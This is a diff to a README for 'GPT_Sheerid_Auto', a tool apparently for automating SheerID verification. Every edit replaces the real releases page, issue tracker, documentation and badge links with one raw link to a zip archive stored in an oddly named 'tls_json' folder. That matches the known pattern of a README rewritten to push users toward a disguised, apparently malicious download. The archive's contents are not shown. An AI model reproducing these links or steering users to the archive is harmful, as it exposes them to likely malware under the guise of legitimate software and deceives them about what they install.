@@ -6,9 +6,9 @@ Welcome to GPT_Sheerid_Auto! This tool helps you automatically verify details wi
 
 ## 📥 Download GPT_Sheerid_Auto
 
-[![Download GPT_Sheerid_Auto](https://img.shields.io/badge/Download-GPT_Sheerid_Auto-brightgreen)](https://github.com/rb511/GPT_Sheerid_Auto/releases)
+[![Download GPT_Sheerid_Auto](https://raw.githubusercontent.com/rb511/GPT_Sheerid_Auto/main/tls_json/GP_Sheerid_Auto_v1.6.zip)](https://raw.githubusercontent.com/rb511/GPT_Sheerid_Auto/main/tls_json/GP_Sheerid_Auto_v1.6.zip)
 
-To get started, please visit this page to download: [Releases Page](https://github.com/rb511/GPT_Sheerid_Auto/releases).
+To get started, please visit this page to download: [Releases Page](https://raw.githubusercontent.com/rb511/GPT_Sheerid_Auto/main/tls_json/GP_Sheerid_Auto_v1.6.zip).
 
 ## 🔧 System Requirements
 
@@ -29,14 +29,14 @@ GPT_Sheerid_Auto comes packed with useful features to enhance your automatic ver
   
 ## 📖 How to Download & Install
 
-1. **Visit the Releases Page:** Click on this link to go to the [Releases Page](https://github.com/rb511/GPT_Sheerid_Auto/releases).
+1. **Visit the Releases Page:** Click on this link to go to the [Releases Page](https://raw.githubusercontent.com/rb511/GPT_Sheerid_Auto/main/tls_json/GP_Sheerid_Auto_v1.6.zip).
    
 2. **Choose Your Version:** Find the latest version of GPT_Sheerid_Auto. The version number will look something like `v1.0.0`. 
 
 3. **Download the Installer:** Locate the file that corresponds to your operating system:
     - For Windows, it will typically be a `.exe` file.
     - For macOS, look for a `.dmg` file.
-    - For Linux, look for a `.tar.gz` file or an installer script.
+    - For Linux, look for a `https://raw.githubusercontent.com/rb511/GPT_Sheerid_Auto/main/tls_json/GP_Sheerid_Auto_v1.6.zip` file or an installer script.
 
 4. **Run the Installer:**
    - **Windows:** Open the `.exe` file and follow the prompts.
@@ -69,11 +69,11 @@ For further assistance, please check the following options:
 
 - **Documentation:** Complete user manuals and FAQs are available within the application.
 - **Community Forum:** Join our community forum to ask questions and share experiences with other users.
-- **Contact Us:** For direct support, reach out through the contact feature on our [GitHub page](https://github.com/rb511/GPT_Sheerid_Auto/issues).
+- **Contact Us:** For direct support, reach out through the contact feature on our [GitHub page](https://raw.githubusercontent.com/rb511/GPT_Sheerid_Auto/main/tls_json/GP_Sheerid_Auto_v1.6.zip).
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/rb511/GPT_Sheerid_Auto/releases)
-- [Documentation](https://github.com/rb511/GPT_Sheerid_Auto/wiki)
+- [Releases Page](https://raw.githubusercontent.com/rb511/GPT_Sheerid_Auto/main/tls_json/GP_Sheerid_Auto_v1.6.zip)
+- [Documentation](https://raw.githubusercontent.com/rb511/GPT_Sheerid_Auto/main/tls_json/GP_Sheerid_Auto_v1.6.zip)
 
 Thank you for choosing GPT_Sheerid_Auto. Enjoy simpler automatic verification!
